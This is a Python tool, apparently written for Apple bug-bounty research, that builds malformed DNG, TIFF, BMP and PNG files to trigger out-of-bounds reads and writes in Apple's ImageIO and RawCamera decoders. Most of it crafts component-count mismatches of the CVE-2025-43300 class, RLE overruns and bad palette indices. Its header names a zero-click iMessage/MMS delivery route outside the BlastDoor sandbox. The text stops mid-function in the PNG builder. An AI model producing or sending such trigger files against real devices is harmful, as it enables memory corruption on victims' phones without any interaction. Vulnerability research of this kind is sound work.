#!/usr/bin/env python3
"""
DNG Metadata Mismatch Fuzzer
Target: Apple ImageIO / RawCamera component
Bug class: SamplesPerPixel (TIFF outer layer) vs inner codec component count mismatch
           Same class as CVE-2025-43300 (DNG+JPEG-Lossless, patched Aug 2025)

New targets:
  - DNG + JPEG-Lossless CFA  (compression=7, PhotometricInterpretation=32803)
    SPP=1 outer, Nf > 1 inner → OOB WRITE (more dangerous direction)
  - DNG + JPEG-Lossless LinearRaw (compression=7, PhotometricInterpretation=34892)
    SPP=3 outer, Nf=1 inner → OOB READ / decoder confusion
  - DNG + JPEG 2000 / JPEG-LS retained for completeness

Apple Bug Bounty: https://security.apple.com/bounty/
Attack surface: RawCamera process runs outside BlastDoor sandbox
Trigger vector: Zero-click via iMessage / MMS auto-download

Usage:
  python dng_fuzzer.py --corpus
  python dng_fuzzer.py --codec jpegl --spp 3 --inner 1 --out trigger.dng
  python dng_fuzzer.py --test-corpus      (macOS only -- uses sips)
"""

import struct
import os
import sys
import subprocess
import argparse
import zlib

# ========================== TIFF/DNG constants ==========================

TIFF_LE_MAGIC = b'II' + struct.pack('<H', 42)

T_SUBFILE_TYPE       = 254
T_IMAGE_WIDTH        = 256
T_IMAGE_LENGTH       = 257
T_BITS_PER_SAMPLE    = 258
T_COMPRESSION        = 259
T_PHOTOMETRIC        = 262
T_STRIP_OFFSETS      = 273
T_SAMPLES_PER_PIXEL  = 277
T_ROWS_PER_STRIP     = 278
T_STRIP_BYTE_COUNTS  = 279
T_X_RESOLUTION       = 282
T_Y_RESOLUTION       = 283
T_PLANAR_CONFIG      = 284
T_RESOLUTION_UNIT    = 296
T_MAKE               = 271
T_MODEL              = 272
T_CFA_REPEAT_DIM     = 33421
T_CFA_PATTERN        = 33422
T_DNG_VERSION        = 50706
T_DNG_BACKWARD_VER   = 50707
T_UNIQUE_CAM_MODEL   = 50708
T_JPEG_TABLES        = 347
T_BLACK_LEVEL        = 50714
T_WHITE_LEVEL        = 50717
T_DEFAULT_SCALE      = 50718
T_DEFAULT_CROP_ORIGIN = 50719
T_DEFAULT_CROP_SIZE  = 50720
T_COLOR_MATRIX1      = 50721
T_AS_SHOT_NEUTRAL    = 50728
T_BASELINE_EXPOSURE  = 50730
T_CALIBRATION_ILLUM1 = 50778

TY_BYTE     = 1
TY_ASCII    = 2
TY_SHORT    = 3
TY_LONG     = 4
TY_RATIONAL = 5
TY_SRATIONAL = 10

COMP_UNCOMPRESSED  = 1
COMP_JPEG_LOSSLESS = 7
COMP_LZW           = 5
COMP_PACKBITS      = 32773   # TIFF PackBits (Apple Macintosh RLE)
COMP_DEFLATE       = 32946   # TIFF Deflate/ZIP (also 8 = standard Deflate)
COMP_JPEG2000      = 34712
COMP_JPEG_LS       = 34892

PHOTO_MINISBLACK = 1    # Grayscale (white = max value)
PHOTO_RGB        = 2    # Standard RGB
PHOTO_YCBCR      = 6    # YCbCr — routes to multi-component-aware JPEG decoder
PHOTO_CFA        = 32803   # Camera Filter Array (Bayer raw) — SPP always=1
PHOTO_LINEAR_RAW = 34892   # Linear demosaiced raw — SPP typically=3

T_YCBCR_SUBSAMPLING = 530   # [HorizSub, VertSub] — e.g. [2,2] for 4:2:0
T_YCBCR_POSITIONING = 531   # 1=centered, 2=cosited
T_REF_BLACK_WHITE   = 532   # 6 rationals: [Yblack,Ywhite,Cbblack,Cbwhite,Crblack,Crwhite]

# ========================== Two-pass TIFF builder ==========================

class TiffBuilder:
    """
    Correct two-pass TIFF builder.

    Pass 1 (add_* calls): collect all entries as (tag, typ, count, inline_int OR bytes).
    Pass 2 (build):       sort entries, compute the IFD size, assign real offsets to
                          all blob entries, then assemble header + IFD + extra data.

    This avoids the classic bug of computing offsets before knowing the total
    entry count, which makes every data pointer wrong.
    """

    def __init__(self):
        self._items = []
        self._ifd_base = 8  # IFD always starts at byte 8

    def _add(self, tag, typ, count, value):
        self._items.append((tag, typ, count, value))

    def add_short(self, tag, value):
        self._add(tag, TY_SHORT, 1, int(value))

    def add_long(self, tag, value):
        self._add(tag, TY_LONG, 1, int(value))

    def add_short_array(self, tag, values):
        if len(values) == 1:
            self._add(tag, TY_SHORT, 1, int(values[0]))
        else:
            self._add(tag, TY_SHORT, len(values),
                      b''.join(struct.pack('<H', v) for v in values))

    def add_byte_array(self, tag, data):
        data = bytes(data)
        if len(data) <= 4:
            val = int.from_bytes(data.ljust(4, b'\x00'), 'little')
            self._add(tag, TY_BYTE, len(data), val)
        else:
            self._add(tag, TY_BYTE, len(data), data)

    def add_ascii(self, tag, text):
        data = text.encode('ascii') + b'\x00'
        self._add(tag, TY_ASCII, len(data), data)

    def add_rational(self, tag, num, den):
        self._add(tag, TY_RATIONAL, 1, struct.pack('<II', int(num), int(den)))

    def add_srational(self, tag, num, den):
        self._add(tag, TY_SRATIONAL, 1, struct.pack('<ii', int(num), int(den)))

    def add_rational_array(self, tag, pairs):
        data = b''.join(struct.pack('<II', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_RATIONAL, len(pairs), data)

    def add_srational_array(self, tag, pairs):
        data = b''.join(struct.pack('<ii', int(n), int(d)) for n, d in pairs)
        self._add(tag, TY_SRATIONAL, len(pairs), data)

    def add_strip(self, strip_tag_offset, strip_tag_count, data):
        """Register strip payload; offset is resolved in build()."""
        data = bytes(data)
        self._add(strip_tag_offset, TY_LONG, 1, _StripRef(data))
        self._add(strip_tag_count,  TY_LONG, 1, len(data))

    def build(self):
        items = sorted(self._items, key=lambda x: x[0])
        n = len(items)

        ifd_size   = 2 + n * 12 + 4
        extra_base = self._ifd_base + ifd_size

        extra_data = bytearray()
        ifd_rows   = []
        strip_blobs = {}

        for tag, typ, count, value in items:
            if isinstance(value, _StripRef):
                strip_blobs[tag] = value.data
                ifd_rows.append((tag, typ, count, None))
            elif isinstance(value, bytes):
                offset = extra_base + len(extra_data)
                extra_data += value
                ifd_rows.append((tag, typ, count, offset))
            else:
                ifd_rows.append((tag, typ, count, int(value)))

        strip_offsets = {}
        for tag, data in strip_blobs.items():
            strip_offsets[tag] = extra_base + len(extra_data)
            extra_data += data

        ifd_bytes = struct.pack('<H', n)
        for (tag, typ, count, offset) in ifd_rows:
            real_offset = strip_offsets.get(tag, offset)
            ifd_bytes += struct.pack('<HHII', tag, typ, count, real_offset)
        ifd_bytes += struct.pack('<I', 0)  # no next IFD

        header = TIFF_LE_MAGIC + struct.pack('<I', self._ifd_base)
        return header + ifd_bytes + bytes(extra_data)


class _StripRef:
    def __init__(self, data):
        self.data = bytes(data)


# ========================== Plain TIFF builder (diagnostic + mismatch target) ==========================

def build_plain_tiff(width=8, height=8, spp=1, bits=8,
                     codec=COMP_UNCOMPRESSED, inner_comps=None):
    """
    Plain TIFF — NO DNG tags, standard PhotometricInterpretation.

    When codec=COMP_JPEG_LOSSLESS and inner_comps != spp, this tests the TIFF
    JPEG-Lossless decoder's SPP vs Nf mismatch path — same bug class as
    CVE-2025-43300 but via the standard TIFF plugin (not Camera Raw).

    Since we know the uncompressed TIFF path works (rc=0), a CTRL case with
    codec=JPEGL and inner_comps==spp tells us if sips handles TIFF+JPEGL at all.
    A mismatch case (inner_comps < spp) then tests for the OOB bug.
    """
    if inner_comps is None:
        inner_comps = spp

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, codec)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    if codec == COMP_UNCOMPRESSED:
        payload = bytes(width * height * spp * (bits // 8))
    elif codec == COMP_JPEG_LOSSLESS:
        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
    else:
        payload = bytes(width * height * spp * (bits // 8))

    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
    return b.build()


# ========================== TIFF + YCbCr + JPEG-Lossless ==========================

def build_tiff_ycbcr_jpegl(width=64, height=64, spp=3, inner_comps=3):
    """
    TIFF with PhotometricInterpretation=YCbCr (6) + JPEG-Lossless (compression=7).

    YCbCr photometric routes to a multi-component-aware JPEG decoder path.
    Unlike MinIsBlack/RGB which Apple decoded as single-component, the YCbCr
    handler is expected to process Y, Cb, Cr as 3 separate components.

    Mismatch targets:
      spp=3 (TIFF outer — 3-channel YCbCr buffer), inner_comps=1 (SOF3 Nf=1)
      → decoder allocates for 3 channels, iterates over inner_comps=1 → OOB READ
      spp=1 (TIFF outer — 1-channel buffer), inner_comps=3 (SOF3 Nf=3)
      → decoder writes 3 channels into 1-channel buffer → OOB WRITE
    """
    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,  width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
    b.add_short(T_COMPRESSION, COMP_JPEG_LOSSLESS)
    b.add_short(T_PHOTOMETRIC, PHOTO_YCBCR)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    # YCbCr required tags
    b.add_short_array(T_YCBCR_SUBSAMPLING, [1, 1])   # 4:4:4 — no subsampling
    b.add_short(T_YCBCR_POSITIONING, 1)               # centered
    b.add_rational_array(T_REF_BLACK_WHITE, [          # standard JFIF/JPEG ranges
        (0, 1), (255, 1),   # Y:  0..255
        (128, 1), (255, 1), # Cb: 128±127
        (128, 1), (255, 1), # Cr: 128±127
    ])
    payload = build_jpegl(width, height, nf=inner_comps, bits=8)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)
    return b.build()


# ========================== Old-style TIFF/JPEG-Lossless (JPEGTables split) ==========================

def build_tiff_jpegl_split(width=64, height=64, spp=1, bits=8, inner_comps=None):
    """
    TIFF/JPEG-Lossless using the split-table format (TIFF Tech Note 2):
      Tag 347 (JPEGTables): SOI + SOF3 + DHT + EOI   (tables only, no scan data)
      Strip data:           SOI + SOS + scan + EOI

    Some decoders locate the SOF3 frame header exclusively in tag 347 rather
    than inside the strip.  If our self-contained strip format is rejected,
    this split format may be accepted by Apple's TIFF/JPEGL decoder.

    inner_comps: Nf in SOF3/SOS (mismatch target when != spp)
    """
    if inner_comps is None:
        inner_comps = spp

    n_cats = bits + 1
    bits_array = [0] * 16
    if n_cats <= 16:
        for k in range(n_cats):
            bits_array[k] = 1
        huffval = list(range(n_cats))
    else:
        for k in range(15):
            bits_array[k] = 1
        bits_array[15] = 2
        huffval = list(range(17))

    dht_payload  = b'\x00'
    dht_payload += bytes(bits_array)
    dht_payload += bytes(huffval)

    # ---- JPEGTables block (tag 347): SOI + SOF3 + DHT + EOI ----
    tables = bytearray()
    tables += b'\xff\xd8'                                    # SOI
    lsof = 8 + 3 * inner_comps
    tables += b'\xff\xc3' + struct.pack('>H', lsof)
    tables += struct.pack('>BHH', bits, height, width)
    tables += struct.pack('>B', inner_comps)
    for i in range(inner_comps):
        tables += struct.pack('>BBB', i + 1, 0x11, 0x00)
    tables += b'\xff\xc4' + struct.pack('>H', 2 + len(dht_payload))
    tables += dht_payload
    tables += b'\xff\xd9'                                    # EOI

    # ---- Strip: SOI + SOS + scan data + EOI ----
    strip = bytearray()
    strip += b'\xff\xd8'                                     # SOI
    lsos = 6 + 2 * inner_comps
    strip += b'\xff\xda' + struct.pack('>H', lsos)
    strip += struct.pack('>B', inner_comps)
    for i in range(inner_comps):
        strip += struct.pack('>BB', i + 1, 0x00)
    strip += b'\x01\x00\x00'                                 # Ss=1, Se=0, Ah/Al=0
    n_bits = width * height * inner_comps
    strip += bytes((n_bits + 7) // 8)                        # all-zero errors (midpoint image)
    strip += b'\xff\xd9'                                     # EOI

    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,    width)
    b.add_long(T_IMAGE_LENGTH,   height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION,   COMP_JPEG_LOSSLESS)
    b.add_short(T_PHOTOMETRIC,   PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_byte_array(T_JPEG_TABLES, bytes(tables))
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, bytes(strip))
    return b.build()


# ========================== Plain TIFF + JPEG-LS ==========================

def build_tiff_jpegls(width=64, height=64, spp=3, inner_comps=None):
    """
    Plain TIFF with Compression=34892 (JPEG-LS) — not DNG, no Camera Raw routing.
    JPEG-LS supports multi-component, so Apple's JPEG-LS decoder may iterate over
    all Nf components (unlike the JPEGL decoder which is single-component).

    inner_comps: Nf in SOF55 header (mismatch target when != spp)
    """
    if inner_comps is None:
        inner_comps = spp
    b = TiffBuilder()
    b.add_long(T_IMAGE_WIDTH,  width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [8] * spp)
    b.add_short(T_COMPRESSION, COMP_JPEG_LS)
    b.add_short(T_PHOTOMETRIC, PHOTO_RGB if spp >= 3 else PHOTO_MINISBLACK)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)
    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS,
                build_jpegls(width, height, nf=inner_comps, bits=8))
    return b.build()


# ========================== JPEG 2000 codestream ==========================

def build_j2k(width, height, csiz, bits=16):
    """
    Minimal JPEG 2000 codestream.
    csiz: Csiz field in SIZ marker = inner component count.
    When csiz < TIFF SamplesPerPixel the decompression loop
    may iterate (SPP / csiz) times too many → OOB write.
    """
    s = bytearray()
    s += b'\xFF\x4F'  # SOC

    lsiz = 38 + 3 * max(csiz, 1)
    s += b'\xFF\x51'
    s += struct.pack('>H', lsiz)
    s += struct.pack('>H', 0)
    s += struct.pack('>I', width)
    s += struct.pack('>I', height)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', width)
    s += struct.pack('>I', height)
    s += struct.pack('>I', 0)
    s += struct.pack('>I', 0)
    s += struct.pack('>H', max(csiz, 1))  # Csiz <-- INNER METADATA
    for _ in range(max(csiz, 1)):
        s += struct.pack('>B', (bits - 1) & 0x7F)
        s += b'\x01'
        s += b'\x01'

    # COD
    s += b'\xFF\x52'
    cod = bytearray()
    cod += struct.pack('>H', 12)
    cod += b'\x00\x00'
    cod += struct.pack('>H', 1)
    cod += b'\x00\x05\x04\x04\x00\x00'
    s += bytes(cod)

    # QCD
    num_subbands = 1 + 3 * 5
    qcd_inner = b'\x00' + b'\x80\x00' * num_subbands
    s += b'\xFF\x5C'
    s += struct.pack('>H', len(qcd_inner) + 2)
    s += qcd_inner

    # SOT
    s += b'\xFF\x90'
    s += struct.pack('>H', 10)
    s += struct.pack('>H', 0)
    s += struct.pack('>I', 0)
    s += b'\x00\x01'

    # SOD + stub
    s += b'\xFF\x93'
    s += b'\x00' * max(width * max(csiz, 1) * 2, 32)
    s += b'\xFF\xD9'  # EOC

    return bytes(s)


# ========================== JPEG-LS codestream ==========================

def build_jpegls(width, height, nf, bits=8):
    """
    Minimal JPEG-LS codestream.
    nf: number of components in SOF55 = inner component count.
    """
    bits = min(bits, 8)
    nf = max(nf, 1)
    s = bytearray()
    s += b'\xFF\xD8'  # SOI

    lsof = 8 + 3 * nf
    s += b'\xFF\xF7'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)
    s += struct.pack('>H', height)
    s += struct.pack('>H', width)
    s += struct.pack('>B', nf)  # Nf <-- INNER METADATA
    for i in range(nf):
        s += struct.pack('>B', i + 1)
        s += b'\x11'
        s += b'\x00'

    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)
        s += b'\x00'
    s += b'\x00\x00\x00'

    s += b'\x00' * max(width * nf, 32)
    s += b'\xFF\xD9'
    return bytes(s)


# ========================== JPEG-Lossless (SOF3) builder ==========================

def build_jpegl(width, height, nf, bits=16):
    """
    JPEG-Lossless (SOF3) stream encoding an all-midpoint image.
    nf: component count in SOF3 = INNER metadata (mismatch target).

    Image: all samples = 2^(P-1) (midpoint of bit depth).
    Predictor Ra (Ss=1): initial Px = 2^(P-1), so every prediction error = 0.
    DHT: unary-code table covering ALL categories 0..(P-1) so decoders that
         validate table completeness before entering the decode loop will accept it.
    Scan data: (w*h*nf) zero bits packed into bytes (all errors = category 0 = '0').
    """
    nf = max(nf, 1)
    s = bytearray()
    s += b'\xFF\xD8'  # SOI

    # SOF3 (JPEG-Lossless frame header)
    lsof = 8 + 3 * nf
    s += b'\xFF\xC3'
    s += struct.pack('>H', lsof)
    s += struct.pack('>B', bits)
    s += struct.pack('>H', height)
    s += struct.pack('>H', width)
    s += struct.pack('>B', nf)       # Nf <-- INNER component count (mismatch target)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Ci: component id
        s += b'\x11'                   # H_i=1, V_i=1 (1×1 sampling)
        s += b'\x00'                   # Tq=0 (unused for lossless)

    # DHT: one DC table (Tc=0, Th=0).
    # SSSS (magnitude category) ranges 0..P for P-bit lossless JPEG.
    # Max prediction error = ±(2^P − 1), which needs SSSS=P.
    # Previous code used n_cats=P (0..P-1), missing SSSS=P — decoders that
    # validate DHT completeness before the decode loop reject it (DRAW_FAILED).
    # Fix: include all P+1 categories.
    n_cats = bits + 1   # 0..P inclusive
    bits_array = [0] * 16
    if n_cats <= 16:
        # Unary prefix: one code per length 1..n_cats
        for k in range(n_cats):
            bits_array[k] = 1
        huffval = list(range(n_cats))
    else:
        # P=16 needs 17 categories but BITS[] only supports lengths 1..16.
        # Assign lengths 1..15 to SSSS 0..14, then two codes at length 16
        # for SSSS 15 and 16.
        for k in range(15):
            bits_array[k] = 1
        bits_array[15] = 2
        huffval = list(range(17))
    dht_payload  = b'\x00'                        # Tc=0 (DC), Th=0
    dht_payload += bytes(bits_array)              # BITS[0..15]
    dht_payload += bytes(huffval)                 # HUFFVAL
    s += b'\xFF\xC4'
    s += struct.pack('>H', 2 + len(dht_payload))
    s += dht_payload

    # SOS (Start of Scan)
    lsos = 6 + 2 * nf
    s += b'\xFF\xDA'
    s += struct.pack('>H', lsos)
    s += struct.pack('>B', nf)
    for i in range(nf):
        s += struct.pack('>B', i + 1)  # Cs: component selector
        s += b'\x00'                   # Td=0 (DC table), Ta=0 (unused)
    s += b'\x01'  # Ss=1 (predictor Ra)
    s += b'\x00'  # Se=0
    s += b'\x00'  # Ah=0, Al=0 (no point transform)

    # Scan data: encode w*h*nf prediction errors of 0 (category 0 = '0' bit each).
    # Total bits = w*h*nf; round up to whole bytes; all zeros → no 0xFF stuffing needed.
    n_bits = width * height * nf
    s += bytes((n_bits + 7) // 8)

    s += b'\xFF\xD9'  # EOI
    return bytes(s)


# ========================== DNG assembler ==========================

def build_dng(width=64, height=64, spp=3, inner_comps=1,
              bits=16, codec=COMP_JPEG2000,
              photometric=PHOTO_LINEAR_RAW, outfile=None,
              camera_model=None):
    """
    Assemble a DNG file with deliberate mismatch between:
      TIFF SamplesPerPixel (spp)       -- outer metadata, controls buffer allocation
      inner codec component count      -- inner metadata, controls loop iteration

    photometric=PHOTO_CFA (32803):
      spp=1 always (Bayer sensor), inner_comps > 1 → OOB WRITE (high priority)
    photometric=PHOTO_LINEAR_RAW (34892):
      spp=3 typically (demosaiced), inner_comps=1 → OOB READ / confusion

    camera_model: if given as (make, model) tuple, adds Make/Model EXIF tags +
      sets UniqueCameraModel, which may cause Camera Raw to use cached calibration
      data for a real camera rather than waiting for network/hanging.
    """
    b = TiffBuilder()

    b.add_long(T_SUBFILE_TYPE, 0)
    b.add_long(T_IMAGE_WIDTH, width)
    b.add_long(T_IMAGE_LENGTH, height)
    b.add_short_array(T_BITS_PER_SAMPLE, [bits] * spp)
    b.add_short(T_COMPRESSION, codec)
    b.add_short(T_PHOTOMETRIC, photometric)
    b.add_short(T_SAMPLES_PER_PIXEL, spp)
    b.add_long(T_ROWS_PER_STRIP, height)
    b.add_short(T_PLANAR_CONFIG, 1)
    b.add_short(T_RESOLUTION_UNIT, 2)
    b.add_rational(T_X_RESOLUTION, 72, 1)
    b.add_rational(T_Y_RESOLUTION, 72, 1)

    # CFA-specific tags (only for Bayer/CFA DNG)
    if photometric == PHOTO_CFA:
        b.add_short_array(T_CFA_REPEAT_DIM, [2, 2])
        b.add_byte_array(T_CFA_PATTERN, bytes([0, 1, 1, 2]))  # RGGB Bayer

    # DNG identification
    b.add_byte_array(T_DNG_VERSION,      bytes([1, 4, 0, 0]))
    b.add_byte_array(T_DNG_BACKWARD_VER, bytes([1, 1, 0, 0]))
    if camera_model:
        make, model = camera_model
        b.add_ascii(T_MAKE, make)
        b.add_ascii(T_MODEL, model)
        b.add_ascii(T_UNIQUE_CAM_MODEL, model)
    else:
        b.add_ascii(T_UNIQUE_CAM_MODEL, 'FuzzResearch/ImageIOAudit')

    # DNG Camera Raw mandatory tags
    b.add_rational_array(T_DEFAULT_SCALE,       [(1, 1), (1, 1)])
    b.add_rational_array(T_DEFAULT_CROP_ORIGIN, [(0, 1), (0, 1)])
    b.add_rational_array(T_DEFAULT_CROP_SIZE,   [(width, 1), (height, 1)])
    # ColorMatrix1: approximate identity in camera-to-XYZ space (9 SRATIONALs)
    identity_cm = [(10000, 10000), (0, 1), (0, 1),
                   (0, 1), (10000, 10000), (0, 1),
                   (0, 1), (0, 1), (10000, 10000)]
    b.add_srational_array(T_COLOR_MATRIX1, identity_cm)
    b.add_short(T_CALIBRATION_ILLUM1, 21)  # D65
    # AsShotNeutral: ALWAYS 3 values (R, G, B neutral point for the camera model).
    # Using spp here was wrong — the DNG spec defines this as 3 regardless of SPP.
    b.add_rational_array(T_AS_SHOT_NEUTRAL, [(1, 1), (1, 1), (1, 1)])
    b.add_srational(T_BASELINE_EXPOSURE, 0, 1)
    b.add_short(T_BLACK_LEVEL, 0)
    b.add_long(T_WHITE_LEVEL, (1 << bits) - 1)

    if codec == COMP_UNCOMPRESSED:
        payload = bytes(width * height * spp * (bits // 8))
        label = 'Uncompressed'
    elif codec == COMP_JPEG2000:
        payload = build_j2k(width, height, csiz=inner_comps, bits=bits)
        label = f'J2K csiz={inner_comps}'
    elif codec == COMP_JPEG_LS:
        payload = build_jpegls(width, height, nf=inner_comps, bits=min(bits, 8))
        label = f'JPEG-LS nf={inner_comps}'
    elif codec == COMP_JPEG_LOSSLESS:
        payload = build_jpegl(width, height, nf=inner_comps, bits=bits)
        label = f'JPEG-L nf={inner_comps}'
    else:
        raise ValueError(f'Unknown codec: {codec}')

    b.add_strip(T_STRIP_OFFSETS, T_STRIP_BYTE_COUNTS, payload)

    data = b.build()

    if outfile:
        with open(outfile, 'wb') as f:
            f.write(data)

        alloc = width * height * spp * (bits // 8)
        if 0 < inner_comps < spp:
            write   = alloc * (spp // inner_comps)
            overflow = write - alloc
        elif inner_comps > spp > 0:
            write   = alloc
            overflow = width * height * (inner_comps - spp) * (bits // 8)
        else:
            write = alloc
            overflow = 0

        photo_name = {PHOTO_CFA: 'CFA', PHOTO_LINEAR_RAW: 'LinearRaw',
                      PHOTO_MINISBLACK: 'Gray', PHOTO_RGB: 'RGB'}.get(photometric, str(photometric))
        print(f'\n[+] {outfile}')
        print(f'    Codec:         {label}  Photo: {photo_name}')
        print(f'    Dimensions:    {width} x {height}   BitsPerSample: {bits}')
        print(f'    TIFF SPP:      {spp}   (outer -- controls malloc size)')
        print(f'    Inner comps:   {inner_comps}   (inner -- controls loop count)')
        print(f'    File size:     {len(data):,} bytes')
        print(f'    Alloc (est):   {alloc:,} bytes')
        print(f'    OOB est:       {overflow:,} bytes')

    return data


# ========================== BMP builder ==========================

def build_bmp(width, height, bpp=24, bi_size_image_override=None):
    """
    BMP file for biSizeImage mismatch and large-dimension overflow testing.

    bi_size_image_override: if set, biSizeImage is declared as this value while
      width*height*bpp/8 is much larger. A decoder that trusts biSizeImage for
      bounds checking but reads width*height pixels will OOB read past the buffer.

    Large width/height: stride = ((w*bpp+31)//32)*4 may overflow 32-bit arithmetic
      in Apple's BMPImagePlugin, causing under-allocation followed by OOB write.
    """
    BMFH = 14
    BMIH = 40

    palette = b''
    if bpp <= 8:
        n_colors = 1 << bpp
        palette = b''.join(
            struct.pack('<BBBB', i * 255 // max(n_colors - 1, 1),
                                 i * 255 // max(n_colors - 1, 1),
                                 i * 255 // max(n_colors - 1, 1), 0)
            for i in range(n_colors)
        )

    pix_offset = BMFH + BMIH + len(palette)
    stride = ((abs(width) * bpp + 31) // 32) * 4
    true_pix_size = stride * abs(height)

    # Include pixel data up to 64 KB — enough for valid CTRL cases (typically < 16KB)
    # but small enough that large-width attack cases don't actually generate GB files.
    # The decoder will OOB-read/write when it tries to process width*height pixels beyond
    # the small actual data in the file.
    pixel_data = bytes(min(true_pix_size, 65536))
    declared_size = bi_size_image_override if bi_size_image_override is not None else 0
    file_size = pix_offset + len(pixel_data)

    bfh = b'BM' + struct.pack('<IHHI', file_size, 0, 0, pix_offset)
    # biHeight positive = bottom-up (standard)
    bih = struct.pack('<IiiHHIIiiII',
        BMIH, width, abs(height), 1, bpp, 0, declared_size, 0, 0, 0, 0)
    return bfh + bih + palette + pixel_data


def build_bmp_rle8_overflow(width=64, height=64, extra_rows=4):
    """
    BMP with BI_RLE8 compression (biCompression=1) where the encoded RLE stream
    contains extra_rows rows beyond the declared height.

    The decoder allocates width*height pixels. If it processes the RLE stream until
    the End-of-Bitmap marker without checking against the declared height,
    it writes extra_rows*width bytes past the end of the output buffer (OOB write).

    Attack surface: Apple's BI_RLE8 decoder in BMPImagePlugin.
    """
    BMFH = 14
    BMIH = 40

    # Full 256-entry palette required for RLE8
    palette = b''.join(struct.pack('<BBBB', i, i, i, 0) for i in range(256))
    pix_offset = BMFH + BMIH + len(palette)

    # Craft RLE8 stream encoding (height + extra_rows) rows of pixels.
    # RLE8 encoded-mode: [count, pixel_value]  — repeat count times.
    # Escape-mode: [0,0]=EOL, [0,1]=EOB, [0,2,dx,dy]=delta, [0,n,...]=absolute.
    rle = bytearray()
    for _ in range(height + extra_rows):
        remaining = width
        while remaining > 0:
            run = min(remaining, 255)
            rle += bytes([run, 0x80])   # run of 'run' pixels, value=128 (mid-gray)
            remaining -= run
        rle += bytes([0, 0])            # End of Line
    rle += bytes([0, 1])                # End of Bitmap

    declared_size = len(rle)
    file_size = pix_offset + declared_size

    bfh = b'BM' + struct.pack('<IHHI', file_size, 0, 0, pix_offset)
    bih = struct.pack('<IiiHHIIiiII',
        BMIH, width, height, 1, 8, 1, declared_size, 0, 0, 0, 0)
    return bfh + bih + palette + bytes(rle)


# ========================== PNG builder ==========================

def _png_chunk(ctype, data):
    data = bytes(data)
    crc = zlib.crc32(ctype + data) & 0xFFFFFFFF
    return struct.pack('>I', len(data)) + ctype + data + struct.pack('>I', crc)

PNG_SIG = b'\x89PNG\r\n\x1a\n'


def build_png_palette_oob(width=64, height=64, palette_entries=4, oob_index=200):
    """
    PNG color type 3 (indexed) with pixel indices beyond PLTE size.

    palette_entries: number of RGB triples in PLTE.
    oob_index: pixel value used throughout the image. If oob_index >= palette_entries,
      a decoder that does a direct palette lookup without bounds checking will read:
        color = PLTE_ptr[oob_index * 3]  (past end of PLTE buffer → OOB read)

    Attack surface: Apple's PNG decoder palette expansion path.
    libpng clamps/errors but Apple may use a custom decoder or unpatched libpng.
    """
    ihdr = _png_chunk(b'IHDR',
        struct.pack('>II', width, height) + bytes([8, 3, 0, 0, 0]))

    plte_data = bytes([c for i in range(palette_entries)
                       for c in (i * 17 % 256, i * 31 % 256, i * 47 % 256)])
    plte = _png_chunk(b'PLTE', plte_data)

    oob = min(max(oob_index, 0), 255)
    raw = b''.join(b'\x00' + bytes([oob] * width) for _ in range(height))
    idat = _png_chunk(b'IDAT', zlib.compress(raw))
    iend = _png_chunk(b'IEND', b'')

    return PNG_SIG + ihdr + plte + idat + iend


def build_png_dimension_mismatch(declared_width=4096, declared_height=4096,
                                  actual_rows=4, color_type=2):
    """
    PNG where IHDR declares large dimensions but IDAT only contains a few rows.

    The zlib stream is valid but shorter than (declared_width*channels + 1)*declared_height.
    A decoder that:
      1. allocates declared_width*declared_height*channels bytes upfront, then
      2. decompresses the stream, then
      3. processes all declared_height rows using row-filter reconstruction
    will run off the end of the decompressed buffer at step 3, reading uninit/OOB memory
    for the missing rows.

    color_type: 2=RGB (3 bytes/pixel), 0=gray (1 byte/pixel), 6=RGBA (4 bytes/pixel)
    """
    channels = {0: 1, 2: 3, 3: 1, 4: 2, 6: 4}.get(color_type, 3)

    ihdr = _png_chunk(b'IHDR',
        struct.pack('>II', declared_width, declared_height) +
